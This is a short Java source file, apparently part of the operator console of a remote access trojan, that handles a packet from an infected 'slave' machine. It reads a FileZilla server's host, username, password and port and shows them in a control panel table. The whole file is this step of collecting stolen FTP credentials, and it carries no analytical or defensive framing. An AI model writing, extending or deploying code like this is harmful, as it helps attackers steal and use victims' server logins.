package com.redpois0n.packets;

import com.redpois0n.Slave;
import com.redpois0n.ui.frames.FrameControlPanel;
import com.redpois0n.ui.panels.PanelControlFileZilla;

public class PacketFZ extends AbstractPacket {

	@Override
	public void read(Slave slave, String line) throws Exception {
		String host = slave.readLine();
		String user = slave.readLine();
		String pass = slave.readLine();
		String port = slave.readLine();

		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlFileZilla panel = (PanelControlFileZilla) frame.panels.get("filezilla");
			panel.getModel().addRow(new Object[] { host, user, pass, port });
		}
	}

}
